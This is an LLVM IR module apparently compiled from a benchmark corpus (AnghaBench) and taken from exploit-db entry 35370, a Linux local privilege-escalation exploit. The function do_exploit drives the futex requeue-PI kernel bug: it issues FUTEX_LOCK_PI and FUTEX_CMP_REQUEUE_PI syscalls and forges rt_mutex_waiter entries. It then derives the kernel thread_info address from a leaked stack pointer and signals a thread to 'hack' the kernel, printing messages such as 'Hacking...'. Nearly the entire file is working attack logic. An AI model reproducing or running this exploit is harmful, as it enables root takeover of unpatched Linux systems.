; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_35370.c_do_exploit.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_35370.c_do_exploit.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.thread_info = type { i32 }
%struct.rt_mutex_waiter = type { %struct.rt_mutex*, %struct.TYPE_6__ }
%struct.rt_mutex = type { i32 }
%struct.TYPE_6__ = type { %struct.TYPE_5__, %struct.TYPE_4__ }
%struct.TYPE_5__ = type { i8* }
%struct.TYPE_4__ = type { i8* }

@__NR_futex = common dso_local global i32 0, align 4
@swag2 = common dso_local global i64 0, align 8
@FUTEX_LOCK_PI = common dso_local global i32 0, align 4
@swag = common dso_local global i64 0, align 8
@FUTEX_CMP_REQUEUE_PI = common dso_local global i32 0, align 4
@do_socket_tid_read = common dso_local global i64 0, align 8
@did_socket_tid_read = common dso_local global i64 0, align 8
@waiter_thread_tid = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [31 x i8] c"Checking whether exploitable..\00", align 1
@.str.1 = private unnamed_addr constant [8 x i8] c"failed\0A\00", align 1
@.str.2 = private unnamed_addr constant [27 x i8] c"OK\0ASeaching good magic...\0A\00", align 1
@hack_thread_stack = common dso_local global %struct.thread_info* null, align 8
@.str.3 = private unnamed_addr constant [21 x i8] c"magic1=%p magic2=%p\0A\00", align 1
@.str.4 = private unnamed_addr constant [29 x i8] c"Good magic found\0AHacking...\0A\00", align 1
@pwaiter11 = common dso_local global i32 0, align 4
@hacked_lock = common dso_local global i32 0, align 4
@SIGNAL_HACK_KERNEL = common dso_local global i32 0, align 4
@hacked = common dso_local global i32 0, align 4
@listenfd = common dso_local global i32 0, align 4
@clientfd = common dso_local global i32 0, align 4
@thread_client_to_setup_rt_waiter = common dso_local global i32 0, align 4
@llvm.used = appending global [1 x i8*] [i8* bitcast (i32 (i8*)* @do_exploit to i8*)], section "llvm.metadata"

; Function Attrs: noinline nounwind optnone uwtable
define internal i32 @do_exploit(i8* %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca %struct.rt_mutex_waiter*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca %struct.rt_mutex_waiter, align 8
  %18 = alloca %struct.rt_mutex*, align 8
  %19 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  %20 = load i8*, i8** %3, align 8
  %21 = call %struct.rt_mutex_waiter* @PRIO_LIST_TO_WAITER(i8* %20)
  store %struct.rt_mutex_waiter* %21, %struct.rt_mutex_waiter** %6, align 8
  %22 = load i32, i32* @__NR_futex, align 4
  %23 = load i32, i32* @FUTEX_LOCK_PI, align 4
  %24 = call i32 @syscall(i32 %22, i64* @swag2, i32 %23, i32 1, i32 0, i64* null, i64 0)
  br label %25

25:                                               ; preds = %31, %1
  %26 = load i32, i32* @__NR_futex, align 4
  %27 = load i32, i32* @FUTEX_CMP_REQUEUE_PI, align 4
  %28 = load i64, i64* @swag, align 8
  %29 = call i32 @syscall(i32 %26, i64* @swag, i32 %27, i32 1, i32 0, i64* @swag2, i64 %28)
  %30 = icmp ne i32 %29, 1
  br i1 %30, label %31, label %33

31:                                               ; preds = %25
  %32 = call i32 @usleep(i32 10)
  br label %25

33:                                               ; preds = %25
  %34 = call i32 @create_thread_do_futex_lock_pi_with_priority(i32 6)
  store i32 %34, i32* %12, align 4
  %35 = call i32 @create_thread_do_futex_lock_pi_with_priority(i32 7)
  store i32 %35, i32* %13, align 4
  store i64 0, i64* @swag2, align 8
  store i64 0, i64* @do_socket_tid_read, align 8
  store i64 0, i64* @did_socket_tid_read, align 8
  %36 = load i32, i32* @__NR_futex, align 4
  %37 = load i32, i32* @FUTEX_CMP_REQUEUE_PI, align 4
  %38 = load i64, i64* @swag2, align 8
  %39 = call i32 @syscall(i32 %36, i64* @swag2, i32 %37, i32 1, i32 0, i64* @swag2, i64 %38)
  %40 = load i32, i32* @waiter_thread_tid, align 4
  %41 = call i64 @sync_with_child_getchar(i32 %40, i64* @do_socket_tid_read, i64* @did_socket_tid_read)
  %42 = icmp slt i64 %41, 0
  br i1 %42, label %43, label %44

43:                                               ; preds = %33
  store i32 0, i32* %2, align 4
  br label %154

44:                                               ; preds = %33
  %45 = load %struct.rt_mutex_waiter*, %struct.rt_mutex_waiter** %6, align 8
  %46 = call i32 @setup_waiter_params(%struct.rt_mutex_waiter* %45)
  %47 = load %struct.rt_mutex_waiter*, %struct.rt_mutex_waiter** %6, align 8
  %48 = getelementptr inbounds %struct.rt_mutex_waiter, %struct.rt_mutex_waiter* %47, i64 0
  %49 = getelementptr inbounds %struct.rt_mutex_waiter, %struct.rt_mutex_waiter* %48, i32 0, i32 1
  %50 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %49, i32 0, i32 1
  %51 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %50, i32 0, i32 0
  %52 = load i8*, i8** %51, align 8
  store i8* %52, i8** %4, align 8
  %53 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str, i64 0, i64 0))
  %54 = call i32 @create_thread_do_futex_lock_pi_with_priority(i32 11)
  store i32 %54, i32* %14, align 4
  %55 = load %struct.rt_mutex_waiter*, %struct.rt_mutex_waiter** %6, align 8
  %56 = getelementptr inbounds %struct.rt_mutex_waiter, %struct.rt_mutex_waiter* %55, i64 0
  %57 = getelementptr inbounds %struct.rt_mutex_waiter, %struct.rt_mutex_waiter* %56, i32 0, i32 1
  %58 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %57, i32 0, i32 1
  %59 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %58, i32 0, i32 0
  %60 = load i8*, i8** %59, align 8
  %61 = load i8*, i8** %4, align 8
  %62 = icmp eq i8* %60, %61
  br i1 %62, label %63, label %65

63:                                               ; preds = %44
  %64 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i64 0, i64 0))
  store i32 0, i32* %2, align 4
  br label %154

65:                                               ; preds = %44
  %66 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.2, i64 0, i64 0))
  %67 = load %struct.rt_mutex_waiter*, %struct.rt_mutex_waiter** %6, align 8
  %68 = getelementptr inbounds %struct.rt_mutex_waiter, %struct.rt_mutex_waiter* %67, i64 0
  %69 = getelementptr inbounds %struct.rt_mutex_waiter, %struct.rt_mutex_waiter* %68, i32 0, i32 1
  %70 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %69, i32 0, i32 1
  %71 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %70, i32 0, i32 0
  %72 = load i8*, i8** %71, align 8
  store i8* %72, i8** %4, align 8
  %73 = load i32, i32* %14, align 4
  %74 = call i32 @pthread_cancel_immediately(i32 %73)
  br label %75

75:                                               ; preds = %65, %117
  %76 = load %struct.rt_mutex_waiter*, %struct.rt_mutex_waiter** %6, align 8
  %77 = call i32 @setup_waiter_params(%struct.rt_mutex_waiter* %76)
  %78 = call i32 @create_thread_do_futex_lock_pi_with_priority(i32 11)
  store i32 %78, i32* %15, align 4
  %79 = load %struct.rt_mutex_waiter*, %struct.rt_mutex_waiter** %6, align 8
  %80 = getelementptr inbounds %struct.rt_mutex_waiter, %struct.rt_mutex_waiter* %79, i64 0
  %81 = getelementptr inbounds %struct.rt_mutex_waiter, %struct.rt_mutex_waiter* %80, i32 0, i32 1
  %82 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %81, i32 0, i32 1
  %83 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %82, i32 0, i32 0
  %84 = load i8*, i8** %83, align 8
  store i8* %84, i8** %4, align 8
  %85 = load i8*, i8** %4, align 8
  %86 = ptrtoint i8* %85 to i64
  %87 = and i64 %86, -8192
  %88 = inttoptr i64 %87 to %struct.thread_info*
  store %struct.thread_info* %88, %struct.thread_info** @hack_thread_stack, align 8
  %89 = load %struct.thread_info*, %struct.thread_info** @hack_thread_stack, align 8
  %90 = getelementptr inbounds %struct.thread_info, %struct.thread_info* %89, i32 0, i32 0
  %91 = bitcast i32* %90 to i8*
  %92 = load %struct.rt_mutex_waiter*, %struct.rt_mutex_waiter** %6, align 8
  %93 = getelementptr inbounds %struct.rt_mutex_waiter, %struct.rt_mutex_waiter* %92, i64 1
  %94 = getelementptr inbounds %struct.rt_mutex_waiter, %struct.rt_mutex_waiter* %93, i32 0, i32 1
  %95 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %94, i32 0, i32 0
  %96 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %95, i32 0, i32 0
  store i8* %91, i8** %96, align 8
  %97 = call i32 @create_thread_do_futex_lock_pi_with_priority(i32 11)
  store i32 %97, i32* %16, align 4
  %98 = load %struct.rt_mutex_waiter*, %struct.rt_mutex_waiter** %6, align 8
  %99 = getelementptr inbounds %struct.rt_mutex_waiter, %struct.rt_mutex_waiter* %98, i64 1
  %100 = getelementptr inbounds %struct.rt_mutex_waiter, %struct.rt_mutex_waiter* %99, i32 0, i32 1
  %101 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %100, i32 0, i32 0
  %102 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %101, i32 0, i32 0
  %103 = load i8*, i8** %102, align 8
  store i8* %103, i8** %5, align 8
  %104 = load i8*, i8** %4, align 8
  %105 = load i8*, i8** %5, align 8
  %106 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.3, i64 0, i64 0), i8* %104, i8* %105)
  %107 = load i8*, i8** %4, align 8
  %108 = load i8*, i8** %5, align 8
  %109 = icmp ult i8* %107, %108
  br i1 %109, label %110, label %112

110:                                              ; preds = %75
  %111 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.4, i64 0, i64 0))
  br label %118

112:                                              ; preds = %75
  %113 = load i32, i32* %15, align 4
  %114 = call i32 @pthread_cancel_immediately(i32 %113)
  %115 = load i32, i32* %16, align 4
  %116 = call i32 @pthread_cancel_immediately(i32 %115)
  br label %117

117:                                              ; preds = %112
  br label %75

118:                                              ; preds = %110
  %119 = load i8*, i8** %5, align 8
  %120 = call i32 @NODE_LIST_TO_WAITER(i8* %119)
  store i32 %120, i32* @pwaiter11, align 4
  %121 = call i32 @pthread_mutex_lock(i32* @hacked_lock)
  %122 = load i32, i32* %15, align 4
  %123 = load i32, i32* @SIGNAL_HACK_KERNEL, align 4
  %124 = call i32 @pthread_kill(i32 %122, i32 %123)
  %125 = call i32 @pthread_cond_wait(i32* @hacked, i32* @hacked_lock)
  %126 = call i32 @pthread_mutex_unlock(i32* @hacked_lock)
  %127 = load i32, i32* @listenfd, align 4
  %128 = call i32 @close(i32 %127)
  %129 = load i32, i32* @pwaiter11, align 4
  %130 = call i32 @read_pipe(i32 %129, %struct.rt_mutex_waiter* %17, i32 24)
  store i32 %130, i32* %19, align 4
  %131 = load i32, i32* %19, align 4
  %132 = sext i32 %131 to i64
  %133 = icmp ne i64 %132, 24
  br i1 %133, label %134, label %135

134:                                              ; preds = %118
  store %struct.rt_mutex* null, %struct.rt_mutex** %18, align 8
  br label %138

135:                                              ; preds = %118
  %136 = getelementptr inbounds %struct.rt_mutex_waiter, %struct.rt_mutex_waiter* %17, i32 0, i32 0
  %137 = load %struct.rt_mutex*, %struct.rt_mutex** %136, align 8
  store %struct.rt_mutex* %137, %struct.rt_mutex** %18, align 8
  br label %138

138:                                              ; preds = %135, %134
  %139 = load %struct.rt_mutex*, %struct.rt_mutex** %18, align 8
  %140 = call i32 @fix_rt_mutex_waiter_list(%struct.rt_mutex* %139)
  %141 = load i32, i32* %15, align 4
  %142 = call i32 @pthread_cancel_immediately(i32 %141)
  %143 = load i32, i32* %16, align 4
  %144 = call i32 @pthread_cancel_immediately(i32 %143)
  %145 = load i32, i32* %13, align 4
  %146 = call i32 @pthread_cancel_immediately(i32 %145)
  %147 = load i32, i32* %12, align 4
  %148 = call i32 @pthread_cancel_immediately(i32 %147)
  %149 = load i32, i32* @clientfd, align 4
  %150 = call i32 @close(i32 %149)
  %151 = load i32, i32* @thread_client_to_setup_rt_waiter, align 4
  %152 = call i32 @pthread_cancel_immediately(i32 %151)
  %153 = call i32 @exit(i32 0) #3
  unreachable

154:                                              ; preds = %63, %43
  %155 = load i32, i32* %2, align 4
  ret i32 %155
}

declare dso_local %struct.rt_mutex_waiter* @PRIO_LIST_TO_WAITER(i8*) #1

declare dso_local i32 @syscall(i32, i64*, i32, i32, i32, i64*, i64) #1

declare dso_local i32 @usleep(i32) #1

declare dso_local i32 @create_thread_do_futex_lock_pi_with_priority(i32) #1

declare dso_local i64 @sync_with_child_getchar(i32, i64*, i64*) #1

declare dso_local i32 @setup_waiter_params(%struct.rt_mutex_waiter*) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @pthread_cancel_immediately(i32) #1

declare dso_local i32 @NODE_LIST_TO_WAITER(i8*) #1

declare dso_local i32 @pthread_mutex_lock(i32*) #1

declare dso_local i32 @pthread_kill(i32, i32) #1

declare dso_local i32 @pthread_cond_wait(i32*, i32*) #1

declare dso_local i32 @pthread_mutex_unlock(i32*) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @read_pipe(i32, %struct.rt_mutex_waiter*, i32) #1

declare dso_local i32 @fix_rt_mutex_waiter_list(%struct.rt_mutex*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
